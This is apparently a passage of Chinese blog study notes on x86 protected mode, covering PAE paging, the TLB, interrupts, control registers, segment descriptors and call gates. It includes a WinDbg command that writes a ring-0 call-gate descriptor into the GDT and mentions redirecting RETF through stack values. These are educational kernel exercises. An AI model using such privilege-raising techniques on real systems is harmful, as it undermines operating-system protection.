id="首先要明白一点，PAE和非PAE指的是物理寻址扩不扩大，也就是PTE的位数扩不扩大，原来的内存大小是4G，因为首先PTE是寻物理地址的，记录了寻址时物理地址的起始地址。PTE的大小是4字节32位寻址范围是2的32次方，寻址范围就是4G，因为线性地址是32位，所以是10-10-12（10是因为4k大小能存2的10次方个，12是页内偏移，因为不管PAE还是不PAE页大小都是4K），PAE技术就是把PTE变为8个字节（64位），所以寻址理论上就能变成2的64次方（但是这个太大，一般用不了那么多）。所以是2-9-9-12。"><a href="#首先要明白一点，PAE和非PAE指的是物理寻址扩不扩大，也就是PTE的位数扩不扩大，原来的内存大小是4G，因为首先PTE是寻物理地址的，记录了寻址时物理地址的起始地址。PTE的大小是4字节32位寻址范围是2的32次方，寻址范围就是4G，因为线性地址是32位，所以是10-10-12（10是因为4k大小能存2的10次方个，12是页内偏移，因为不管PAE还是不PAE页大小都是4K），PAE技术就是把PTE变为8个字节（64位），所以寻址理论上就能变成2的64次方（但是这个太大，一般用不了那么多）。所以是2-9-9-12。" class="headerlink" title="首先要明白一点，PAE和非PAE指的是物理寻址扩不扩大，也就是PTE的位数扩不扩大，原来的内存大小是4G，因为首先PTE是寻物理地址的，记录了寻址时物理地址的起始地址。PTE的大小是4字节32位寻址范围是2的32次方，寻址范围就是4G，因为线性地址是32位，所以是10-10-12（10是因为4k大小能存2的10次方个，12是页内偏移，因为不管PAE还是不PAE页大小都是4K），PAE技术就是把PTE变为8个字节（64位），所以寻址理论上就能变成2的64次方（但是这个太大，一般用不了那么多）。所以是2-9-9-12。"></a>首先要明白一点，PAE和非PAE指的是物理寻址扩不扩大，也就是PTE的位数扩不扩大，原来的内存大小是4G，因为首先PTE是寻物理地址的，记录了寻址时物理地址的起始地址。PTE的大小是4字节32位寻址范围是2的32次方，寻址范围就是4G，因为线性地址是32位，所以是10-10-12（10是因为4k大小能存2的10次方个，12是页内偏移，因为不管PAE还是不PAE页大小都是4K），PAE技术就是把PTE变为8个字节（64位），所以寻址理论上就能变成2的64次方（但是这个太大，一般用不了那么多）。所以是2-9-9-12。</h1><h1 id="2-9-9-12分页"><a href="#2-9-9-12分页" class="headerlink" title="2-9-9-12分页"></a>2-9-9-12分页</h1><p>10-10-12分页方式，在这种分页方式下物理地址最多可达4GB。但随着硬件发展，4GB的物理地址范围已经无法满足要求，Intel在1996年就已经意识到这个问题了，所以设计了新的分页方式.也就是我们本节课要讲的2-9-9-12分页,又称为PAE（物理地址扩展）分页.   </p><h2 id="为什么是10-10-12"><a href="#为什么是10-10-12" class="headerlink" title="为什么是10-10-12"></a>为什么是10-10-12</h2><ul><li>先确定了页的大小4K，所以后面的12位的功能就确定了，（一个页4K是4096个字节，所以想让每个页内偏移的字节都能寻址到，就需要4096个地址，即2的12次方个，即12位）   </li><li>当初的物理内存比较小，所以4个字节的PTE就够了，加上页的尺寸是4K，所以一个页能存储1024个PTE， 也就是2的10次方，第二个10也就确定了.   </li><li>剩下的10为PDI  10+10+12刚好32位    </li></ul><h2 id="为什么是2-9-9-12"><a href="#为什么是2-9-9-12" class="headerlink" title="为什么是2-9-9-12"></a>为什么是2-9-9-12</h2><ul><li>页的大小是确定的，4KB不能随便改，所以12确定了。   </li><li>如果想增大物理内存的访问范围，就需要增大PTE,增大多少了呢？考虑对齐的因素，增加到8个字节，所以4K/8=512,一个页PTE就是512个，如下图。</li><li>同理PDI也是2的9次方 32 - 9 - 9 - 12 还差2位 所以就再做一级，叫PDPI  </li></ul><p><img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/note/baohumoshi/14.png" alt="PAE技术"></p><h2 id="2-9-9-12分页结构-PAE-物理地址扩展"><a href="#2-9-9-12分页结构-PAE-物理地址扩展" class="headerlink" title="2-9-9-12分页结构(PAE,物理地址扩展)"></a>2-9-9-12分页结构(PAE,物理地址扩展)</h2><p>CR3此时指向PDPTE</p><p><img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/note/baohumoshi/15.png" alt="2-9-9-12分页"></p><h2 id="如何开启PAE模式"><a href="#如何开启PAE模式" class="headerlink" title="如何开启PAE模式"></a>如何开启PAE模式</h2><p>将C:\boot.ini文件中的execute改为noexecute 重启   </p><h2 id="Page-Directory-Point-Table-Entry"><a href="#Page-Directory-Point-Table-Entry" class="headerlink" title="Page-Directory-Point-Table Entry"></a>Page-Directory-Point-Table Entry</h2><p><img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/note/baohumoshi/16.png" alt="Page-Directory-Point-Table Entry"></p><ul><li>PDPTE共有四项(第一个2)。</li><li>35-12 存储的是页目录表的基址，低12位补0，共36位，即页目录基址。    </li></ul><p><img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/note/baohumoshi/17.png" alt="PAE的PDE结构"></p><p>特别说明：</p><ul><li>当PS=1时（第7位）是大页，35-21位是大页的物理地址，这样36位的物理地址的低21位为0，这就意味着页的大小为2MB，且都是2MB对齐。   </li><li>当PS=0时，35-12位是页表基址,低12位补0，共36位。   </li></ul><p>特别说明</p><ul><li>PTE中35-12是物理页基址，24位，低12位补0   </li><li>物理页基址+12位的页内偏移指向具体数据   </li></ul><h2 id="XD标志位（AMD中称为NX-即No-Excetion-）"><a href="#XD标志位（AMD中称为NX-即No-Excetion-）" class="headerlink" title="XD标志位（AMD中称为NX,即No Excetion ）"></a>XD标志位（AMD中称为NX,即No Excetion ）</h2><p>PDE/PTE结构</p><table><thead><tr><th>X</th><th>保留</th><th>35-12  物理地址</th><th>低12位（属性）</th></tr></thead><tbody><tr><td></td></tr></tbody></table><p>段的属性有可读、可写和可执行<br>页的属性有可读、可写<br>当RET执行返回的时候，如果我修改堆栈里面的数据指向一个我提前准备好的数据（把数据当作代码来执行，漏洞都是依赖这点，比如SQL注入也是）<br>所以，Intel就做了硬件保护，做了一个不可执行位，XD=1时。那么你的软件溢出了也没有关系，即使你的EIP蹦到了危险的“数据区”，也是不可以执行的！<br>在PAE分页模式下，PDE与PTE的最高位为XD/NX位.   </p><h1 id="TLB"><a href="#TLB" class="headerlink" title="TLB"></a>TLB</h1><h2 id="地址解析"><a href="#地址解析" class="headerlink" title="地址解析"></a>地址解析</h2><ol><li>通过一个线性地址访问一个物理页。比如：一个DWORD，其实未必真正读的是4个字节，我们先读的PDE再读PTE 最后才读的4个字节的页。   </li><li>在2-9-9-12会读24个字节 如果跨页可能更多。   </li></ol><p>为了提高效率，只能做记录。<br>CPU内部做了一个表，来记录这些东西，这个表格是CPU内部的，和寄存器一样快，这个表格：TLB（Translation Lookaside Buffer）。</p><h2 id="TLB结构"><a href="#TLB结构" class="headerlink" title="TLB结构"></a>TLB结构</h2><table><thead><tr><th>LA（线性地址）</th><th>PA（物理地址）</th><th>ATTR（属性）</th><th>LRU（统计）</th></tr></thead><tbody><tr><td></td></tr></tbody></table><p>说明：</p><ol><li>ATTR（属性）：属性是PDPE，PDE，PTE三个属性AND起来的. 如果是10-10-12，就是PDE and PTE   </li><li>不同的CPU 这个表的大小不一样.</li><li>只要Cr3变了，TLB立马刷新，一核一套TLB.</li></ol><p>操作系统的高2G映射基本不变，如果Cr3改了，TLB刷新 重建高2G以上很浪费。所以PDE和PTE中有个G标志位（PDE是大页时有效），如果G位为1刷新TLB时将不会刷新PDE/PTE的G位为1的页，当TLB满了，根据统计信息将不常用的地址废弃，最近最常用的保留.   </p><h2 id="TLB种类"><a href="#TLB种类" class="headerlink" title="TLB种类"></a>TLB种类</h2><p>TLB在X86体系的CPU里的实际应用最早是从Intel的486CPU开始的，在X86体系的CPU里边，一般都设有如下4组TLB:<br>第一组：缓存一般页表（4K字节页面）的指令页表缓存（Instruction-TLB）；<br>第二组：缓存一般页表（4K字节页面）的数据页表缓存（Data-TLB）；<br>第三组：缓存大尺寸页表（2M/4M字节页面）的指令页表缓存（Instruction-TLB）；<br>第四组：缓存大尺寸页表（2M/4M字节页面）的数据页表缓存（Data-TLB）   </p><h1 id="中断与异常"><a href="#中断与异常" class="headerlink" title="中断与异常"></a>中断与异常</h1><h2 id="什么是中断"><a href="#什么是中断" class="headerlink" title="什么是中断"></a>什么是中断</h2><ol><li>中断通常是由CPU外部的输入输出设备(硬件)所触发的，供外部设备通知CPU“有事情需要处理”，因此又叫中断请求(Interrupt Request).   </li><li>中断请求的目的是希望CPU暂时停止执行当前正在执行的程序，转去执行中断请求所对应的中断处理例程(中断处理程序在哪有IDT表决定)    </li><li>80x86有两条中断请求线：<br> 非屏蔽中断线，称为NMI（NonMaskable Interrupt）<br> 可屏蔽中断线，称为INTR（Interrupt Require</li></ol><h2 id="非可屏蔽中断如何处理"><a href="#非可屏蔽中断如何处理" class="headerlink" title="非可屏蔽中断如何处理"></a>非可屏蔽中断如何处理</h2><p>（固定IDT第二个门）</p><table><thead><tr><th>(IDT表)中断号</th><th>NMI</th><th>说明</th></tr></thead><tbody><tr><td>0x2</td><td>不可屏蔽中断</td><td>80x86中固定为0x2</td></tr></tbody></table><p>特别说明：<br>当非可屏蔽中断产生时，CPU在执行完当前指令后会里面进入中断处理程序<br>非可屏蔽中断不受EFLAG寄存器中IF位的影响，一旦发生，CPU必须处理<br>非可屏蔽中断处理程序位于IDT表中的2号位置    </p><h2 id="可屏蔽中断"><a href="#可屏蔽中断" class="headerlink" title="可屏蔽中断"></a>可屏蔽中断</h2><p>在硬件级，可屏蔽中断是由一块专门的芯片来管理的，通常称为中断控制器.它负责分配中断资源和管理各个中断源发出的中断请求.为了便于标识各个中断请求，中断管理器通常用IRQ(Interrupt Request)后面加上数字来表示不同的中断.</p><p>比如：在Windows中时钟中断的IRQ编号为0，也就是：IRQ0    </p><p>中断的实质是改变程序执行流程   </p><h2 id="可屏蔽中断如何处理？"><a href="#可屏蔽中断如何处理？" class="headerlink" title="可屏蔽中断如何处理？"></a>可屏蔽中断如何处理？</h2><table><thead><tr><th>（IDT表）中断号</th><th>IRQ</th><th>说明</th></tr></thead><tbody><tr><td>0x30</td><td>IRQ0</td><td>时钟中断</td></tr><tr><td>0x31-0x3F</td><td>IRQ1-IRQ15</td><td>其他硬件设备的中断</td></tr></tbody></table><p>特别说明：</p><ol><li>如果自己的程序执行时不希望CPU去处理这些中断，可以<br>用CLI指令清空EFLAG寄存器中的IF位<br>用STI指令设置EFLAG寄存器中的IF位   </li><li>硬件中断与IDT表中的对应关系并非固定不变的，<br>参见：APIC（高级可编程中断控制器）   </li></ol><h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>异常通常是CPU在执行指令时检测到的某些错误，比如除0、访问无效页面等。</p><h3 id="中断与异常的区别："><a href="#中断与异常的区别：" class="headerlink" title="中断与异常的区别："></a>中断与异常的区别：</h3><ol><li>中断来自于外部设备，是中断源（比如键盘）发起的，CPU是被动的.</li><li>异常来自于CPU本身，是CPU主动产生的.</li><li>INT N虽然被称为“软件中断”，但其本质是异常。EFLAG的IF位对INT N无效。   </li></ol><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><p>无论是由硬件设备触发的中断请求还是由CPU产生的异常，处理程序都在IDT表。   </p><table><thead><tr><th>错误类型</th><th>（IDT表）中断号</th></tr></thead><tbody><tr><td>页错误</td><td>0xE</td></tr><tr><td>段错误</td><td>0xD</td></tr><tr><td>除0错误</td><td>0x0</td></tr><tr><td>双重</td><td>0x8</td></tr></tbody></table><h2 id="缺页异常"><a href="#缺页异常" class="headerlink" title="缺页异常"></a>缺页异常</h2><p>缺页异常的产生：<br>1、当PDE/PTE的P=0时<br>2、当PDE/PTE的属性为只读但程序试图写入的时<br>一旦发生缺页异常，CPU会执行IDT表中的0xE号中断处理程序，由操作系统来接管。   </p><h1 id="控制寄存器"><a href="#控制寄存器" class="headerlink" title="控制寄存器"></a>控制寄存器</h1><p>控制寄存器用于控制和确定CPU的操作模式。<br>Cr0 Cr1 Cr2 Cr3 Cr4<br>Cr1 保留<br>Cr3 页目录表基址   </p><h2 id="Cr0寄存器"><a href="#Cr0寄存器" class="headerlink" title="Cr0寄存器"></a>Cr0寄存器</h2><p><img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/note/baohumoshi/18.png" alt="CR0寄存器"></p><p>说明：<br>PE：CR0的位0是启用保护（Protection Enable）标志。<br>PE=1保护模式，PE=0实地址模式，这个标志仅开启段级保护，而并没有启用分页机制。若要启用分页机制，那么PE和PG标志都要置位。<br>PG：当设置该位时即开启了分页机制。在开启这个标志之前必须已经或者同时开启PE标志。<br>PG=0且PE=0，处理器工作在实地址模式下<br>PG=0且PE=1，处理器工作在没有开启分页机制的保护模式下<br>PG=1且PE=0，在PE没有开启的情况下，无法开启PG<br>PG=1且PE=1，处理器工作在开启了分页机制的保护模式下  </p><p>WP：对于Intel 80486或以上的CPU，CR0的位16是写保护（Write Proctect）标志当设置该标志时，处理器会禁止超级用户程序（例如特权级0的程序）向用户级只读页<br>面执行写操作；<br>当CPL&lt;3的时候：<br>如果 WP=0 可以读写任意用户级物理页，只要线性地址有效.<br>如果 WP=1 可以读取任意用户级物理页，但对于只读的物理页，则不能写.   </p><h2 id="Cr2寄存器"><a href="#Cr2寄存器" class="headerlink" title="Cr2寄存器"></a>Cr2寄存器</h2><p>当CPU访问某个无效页面时，会产生缺页异常，此时，CPU会将引起异常的线性地址存放在CR2中。   </p><h2 id="Cr4寄存器"><a href="#Cr4寄存器" class="headerlink" title="Cr4寄存器"></a>Cr4寄存器</h2><p><img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/note/baohumoshi/19.png" alt="Cr4寄存器"></p><h1 id="PWT-PCD"><a href="#PWT-PCD" class="headerlink" title="PWT/PCD"></a>PWT/PCD</h1><h2 id="CPU缓存"><a href="#CPU缓存" class="headerlink" title="CPU缓存"></a>CPU缓存</h2><p>1) CPU缓存是位于CPU与物理内存之间的临时存储器，它的容量比内存小的多但是交换速度却比内存要快得多。<br>2) CPU缓存可以做的很大，有几K、几十K、几百K甚至上M的也有。<br>CPU缓存与TLB的区别：<br>TLB：<br>    线性地址  <----->  物理地址<br>CPU缓存：<br>    物理地址  <----->  内容   </-----></-----></p><h2 id="关于PWT-PCD属性"><a href="#关于PWT-PCD属性" class="headerlink" title="关于PWT/PCD属性"></a>关于PWT/PCD属性</h2><p>PWT：Page Write Through</p><pre><code>PWT =  1 时 写Cache的时候也要将数据写入内存中。</code></pre><p>PCD：Page Cache Disable</p><pre><code>PCD = 1时，禁止某个页写入缓存，直接写内存。比如，做页表用的页，已经存储在TLB中了，可能不需要再缓存了。</code></pre><h1 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h1><p>[1]：滴水视频</p>]]></content>
      
      <categories>
          
          <category> 笔记 - 内核笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 保护模式页 </tag>
            
            <tag> 保护模式 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>保护模式之段相关的笔记</title>
      <link href="/2018/06/23/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E4%B9%8B%E6%AE%B5%E7%9B%B8%E5%85%B3%E7%9A%84%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/06/23/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E4%B9%8B%E6%AE%B5%E7%9B%B8%E5%85%B3%E7%9A%84%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h1 id="段寄存器简介"><a href="#段寄存器简介" class="headerlink" title="段寄存器简介"></a>段寄存器简介</h1><table><thead><tr><th>段寄存器</th><th>Selector</th><th>Attribute</th><th>Base</th><th>Limit</th></tr></thead><tbody><tr><td>ES</td><td>++0023++</td><td>可读可写</td><td>0</td><td>0xFFFFFFFF</td></tr><tr><td>CS</td><td>++001B++</td><td>可读可执行</td><td>0</td><td>0xFFFFFFFF</td></tr><tr><td>SS</td><td>++0023++</td><td>可读可写</td><td>0</td><td>0xFFFFFFFF</td></tr><tr><td>DS</td><td>++0023++</td><td>可读可写</td><td>0</td><td>0xFFFFFFFF</td></tr><tr><td>FS</td><td>++003B++</td><td>可读可写</td><td>++ 0x7FFDE000++</td><td>0xFFF</td></tr><tr><td>GS</td><td>windows没有使用</td><td>-</td><td>-</td><td>-</td></tr></tbody></table><h3 id="注释：加了下划线可能会变"><a href="#注释：加了下划线可能会变" class="headerlink" title="注释：加了下划线可能会变!"></a>注释：加了下划线可能会变!</h3><h2 id="探测Attribute存在"><a href="#探测Attribute存在" class="headerlink" title="探测Attribute存在"></a>探测Attribute存在</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> int <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">char</span>* argu[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__asm&#123;</span><br><span class="line">mov ax,ss;<span class="comment">//cs不行，cs是不可写的</span></span><br><span class="line">mov ds,ax</span><br><span class="line">mov dword ptr ds:[var],eax;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h2 id="探测Base存在"><a href="#探测Base存在" class="headerlink" title="探测Base存在"></a>探测Base存在</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> var = <span class="number">1</span>;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">mov ax,fs</span><br><span class="line">mov gs,ax</span><br><span class="line">mov eax,gs:[<span class="number">0x1000</span>]<span class="comment">//读取不成功，因为fs大小是FFF//不要用DS 否则编译不过，这个不是真正0地址，而是关于基址的偏移</span></span><br><span class="line">mov dword ptr ds:[var],eax</span><br><span class="line"></span><br><span class="line"><span class="comment">//mov edx,dword ptr ds:[0x7FFDF000]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="探测Limit存在"><a href="#探测Limit存在" class="headerlink" title="探测Limit存在"></a>探测Limit存在</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> var = <span class="number">1</span>;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">mov ax,fs</span><br><span class="line">mov gs,ax</span><br><span class="line">mov eax,gs:[<span class="number">0</span>]<span class="comment">//不要用DS 否则编译不过去</span></span><br><span class="line">mov dword ptr ds:[var],eax</span><br><span class="line"></span><br><span class="line"><span class="comment">//mov edx,dword ptr ds:[0x7FFDF000]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="GDT-全局描述符表-LDT-局部描述符表"><a href="#GDT-全局描述符表-LDT-局部描述符表" class="headerlink" title="GDT(全局描述符表)LDT(局部描述符表)"></a>GDT(全局描述符表)LDT(局部描述符表)</h1><p>当我们执行类似MOV DS,AX指令时，CPU会查表，根据AX的值来决定<br>查找GDT还是LDT,查找表的什么位置，查出多少数据.GDT是一张表，GDTR是个寄存器，存了GDT起始位置和有多少个元素。</p><h1 id="段描述符与段选择子"><a href="#段描述符与段选择子" class="headerlink" title="段描述符与段选择子"></a>段描述符与段选择子</h1><h2 id="段描述符"><a href="#段描述符" class="headerlink" title="段描述符"></a>段描述符</h2><p><img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/note/baohumoshi/1.png" alt="段描述符"></p><h2 id="段选择子"><a href="#段选择子" class="headerlink" title="段选择子"></a>段选择子</h2><p>段选择子是一个16位的段描述符，该描述符指向了定义该段的段描述符.<br><img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/note/baohumoshi/2.png" alt="段选择子"></p><p>RPL：请求特权级别</p><p>TI：<br>TI=0  查GDT表<br>TI=1  查LDT表</p><p>Index：<br>处理器将索引值乘以8<br>在加上GDT或者LDT的<br>基地址，就是要加载的<br>段描述符</p><h2 id="加载段描述符至段寄存器"><a href="#加载段描述符至段寄存器" class="headerlink" title="加载段描述符至段寄存器"></a>加载段描述符至段寄存器</h2><p>除了MOV指令，我们还可以使用LES、LSS、LDS、LFS、LGS指令修改寄存器.<br>CS不能通过上述的指令进行修改，CS为代码段，CS的改变会导致EIP的改变，要改CS，必须要保证CS与EIP一起改，后面会讲.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buffer[<span class="number">6</span>];</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">les ecx,fword ptr ds:[buffer] <span class="comment">//高2个字节给es，低四个字节给ecx</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：RPL&lt;=DPL(在数值上)    </p><h1 id="段描述符属性"><a href="#段描述符属性" class="headerlink" title="段描述符属性"></a>段描述符属性</h1><h2 id="P位"><a href="#P位" class="headerlink" title="P位"></a>P位</h2><p>P = 1 段描述符有效<br>P = 0 段描述符无效<br>3、段描述符与段寄存器的对应关系    </p><p>WORD  Selector;//16位<br>WORD  Atrribute;//16位<br>DWORD Base;//32位<br>DWORD Limit;//32位      FFFFFFFF</p><h2 id="S位"><a href="#S位" class="headerlink" title="S位"></a>S位</h2><p>S = 1 代码段或者数据段描述符<br>S = 0 系统段描述符</p><p><img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/note/baohumoshi/3.png" alt="Tpye域"></p><p>因为P，DPL，S位，Type要么是1001（访问本段权限0），要么是1111（访问本段权限3），所以GDT表里第五5要是9或者F才是代码段或者数据段。又因为Type与第一位为1是代码段，所以第六位要是大于8就是代码段。<br>E 向上就是LImit里有效，扩展方向向下是Limit取反才是有效的。  </p><h2 id="系统段描述符"><a href="#系统段描述符" class="headerlink" title="系统段描述符"></a>系统段描述符</h2><p><img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/note/baohumoshi/4.png" alt="系统段Type域"></p><h2 id="DB位"><a href="#DB位" class="headerlink" title="DB位"></a>DB位</h2><p>情况一：对CS段的影响<br>D = 1 采用32位寻址方式<br>D = 0 采用16位寻址方式<br>前缀67 改变寻址方式</p><p>情况二：对SS段的影响<br>D = 1 隐式堆栈访问指令（如：PUSH POP CALL）使用32位堆栈指针寄存器ESP<br>D = 0 隐式堆栈访问指令（如：PUSH POP CALL） 使用16位堆栈指针寄存器SP   </p><p>情况三：向下拓展的数据段   </p><p>D = 1 段上线为4GB<br>D = 0 段上线为64KB<br><img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/note/baohumoshi/5.png" alt="向上与向下扩展"></p><h1 id="段权限检查"><a href="#段权限检查" class="headerlink" title="段权限检查"></a>段权限检查</h1><table><thead><tr><th></th><th></th><th>位置</th><th>用途</th></tr></thead><tbody><tr><td> CPL</td><td>存放在CS和SS段选择子的最后两位更其他无关</td><td>当前程序特权级 ，CPU处于哪一环</td><td></td></tr><tr><td> DPL</td><td>存放在段描述符中</td><td>要访问该段需要什么权限才能访问</td><td></td></tr><tr><td>RPL</td><td>存放在段选择子的最后两位</td><td></td><td></td></tr></tbody></table><p>如何查看程序处于几环?</p><p>CPL(Current Privilege Level) ：当前特权级<br>CS和SS中存储的段选择子后2位，要一致，另外跟这两个有关，跟其他的东西无关<br>DPL(Descriptor Privilege Level)  描述符特权级别</p><p>DPL存储在段描述符中，规定了访问该段所需要的特权级别是什么.<br>通俗的理解：<br>如果你想访问我，那么你应该具备什么特权.<br>举例说明：<br>mov DS,AX  如果AX指向的段DPL = 0  但当前程序的CPL = 3 这行指令是不会成功的！<br>RPL(Request Privilege Level)  请求特权级别<br>RPL是针对段选择子而言的，每个段的选择子都有自己的RPL</p><p>举例说明：</p><p>Mov ax,0008    与    Mov ax,000B//段选择子<br>Mov ds,ax        Mov ds,ax//将段描述<br>指向的是同一个段描述符,但RPL是不一样的.   </p><h2 id="数据段的权限检查"><a href="#数据段的权限检查" class="headerlink" title="数据段的权限检查"></a>数据段的权限检查</h2><p>参考如下代码：<br>比如当前程序处于0环，也就是说CPL=0<br>Mov ax,000B    //1011   RPL = 3<br>Mov ds,ax    //ax指向的段描述符的DPL = 0<br>数据段的权限检查：<br>CPL &lt;= DPL  并且 RPL &lt;= DPL (数值上的比较)<br>注意：<br>代码段和系统段描述符中的检查方式并不一样,具体参加后面课程.</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>CPL  CPU当前的权限级别<br>DPL  如果你想访问我，你应该具备什么样的权限<br>RPL  用什么权限去访问一个段  </p><h4 id="为啥要有RPL"><a href="#为啥要有RPL" class="headerlink" title="为啥要有RPL?"></a>为啥要有RPL?</h4><p>我们本可以用“读写”的权限去打开一个文件，但为了避免出错，有些时候我们使用“只读”的权限去打开。  </p><h1 id="跨段跳转"><a href="#跨段跳转" class="headerlink" title="跨段跳转"></a>跨段跳转</h1><h2 id="代码间的跳转-段间跳转-非调用门之类的"><a href="#代码间的跳转-段间跳转-非调用门之类的" class="headerlink" title="代码间的跳转(段间跳转  非调用门之类的)"></a>代码间的跳转(段间跳转  非调用门之类的)</h2><p>段间跳转，有2种情况，即要跳转的段是一致代码段还是非一致代码段<br>同时修改CS与EIP的指令<br>JMP FAR / CALL FAR / RETF / INT /IRETED<br><strong>注意：</strong><br>只改变EIP的指令<br>JMP / CALL / JCC / RET    </p><p>JMP 0x20:0x004183D7 CPU如何执行这行代码?</p><p>(1) 段选择子拆分</p><pre><code>0x20 对应二进制形式 0000 0000 0010 0000RPL = 00   TI = 0Index = 4</code></pre><p>(2) 查表得到段描述符</p><pre><code>TI = 0 所以查GDT表Index = 4 找到对应的段描述符四种情况可以跳转：代码段、调用门、TSS任务段、任务门</code></pre><p>(3) 权限检查</p><pre><code>如果是非一致代码段，要求:CPL == DPL 并且 RPL &lt;= DPL如果是一致代码段，要求:CPL &gt;= DPL</code></pre><p>(4) 加载段描述符</p><pre><code>通过上面的权限检查后，CPU会将段描述符加载到CS段寄存器中.</code></pre><p>(5) 代码执行</p><pre><code>CPU将 CS.Base + Offset 的值写入EIP 然后执行CS:EIP处的代码，段间跳转结束.</code></pre><h2 id="总结：-1"><a href="#总结：-1" class="headerlink" title="总结："></a>总结：</h2><ol><li><p>对于一致代码段:也就是共享的段</p><ol><li>特权级高的程序不允许访问特权级低的数据：核心态不允许访问用户态的数据</li><li>特权级低的程序可以访问到特权级高的数据，但特权级不会改变：用户态还是用户态</li></ol></li><li>对于普通代码段：也就是非一致代码段<ol><li>只允许同级访问</li><li>绝对禁止不同级别的访问：核心态不是用户态，用户态也不是核心态.</li></ol></li></ol><p>直接对代码段进行JMP 或者CALL的操作，无论目标是一致代码段还是非一致代码段，CPL都不会发生改变.如果要提升CPL的权限，只能通过调用门.</p><h1 id="长调用与短调用"><a href="#长调用与短调用" class="headerlink" title="长调用与短调用"></a>长调用与短调用</h1><p>短调用<br>指令格式：CALL  立即数/寄存器/内存  </p><p><img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/note/baohumoshi/6.png" alt="三种调用图"></p><h1 id="调用门"><a href="#调用门" class="headerlink" title="调用门"></a>调用门</h1><p>调用门执行流程</p><p>指令格式：CALL  CS:EIP(EIP是废弃的)<br>执行步骤：    </p><ol><li>根据CS的值 查GDT表，找到对应的段描述符，这个描述符是一个调用门.  </li><li>在调用门描述符中存储另一个代码段段的选择子.  </li><li>这个调用门的选择子指向的段  段.Base +这个调用门的 偏移地址，就是真正要执行的地址.  </li></ol><p><img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/note/baohumoshi/7.png" alt="门描述符"></p><p>构造一个调用门（无参，提权，不提权8的位置是1B）</p><p>0040EC00 000810D0放入gdt里没用到的位置。</p><p>构造一个带参数的调用门   </p><p>调用门描述符：0040EC03 00081030</p><blockquote><p>eq 8003f048 0040EC03`00081030</p></blockquote><p>调用门总结：</p><p>1) 当通过门，权限不变的时候，只会PUSH两个值：CS  返回地址<br>新的CS的值由调用门决定</p><p>2) 当通过门，权限改变的时候，会PUSH四个值：SS ESP CS  返回地址   新的CS的值由调用门决定  新的SS和ESP由TSS提供</p><p>3) 通过门调用时，要执行哪行代码有调用门决定，但使用RETF返回时，由堆栈中压人的值决定，这就是说，进门时只能按指定路线走，出门时可以翻墙(只要改变堆栈里面的值就可以想去哪去哪)<br>4) 可不可以再建个门出去呢?也就是用Call  当然可以了 前门进 后门出    </p><h1 id="中断门"><a href="#中断门" class="headerlink" title="中断门"></a>中断门</h1><p>Windows没有使用调用门，但是使用了中断门：</p><pre><code>&lt;1&gt; 系统调用&lt;2&gt; 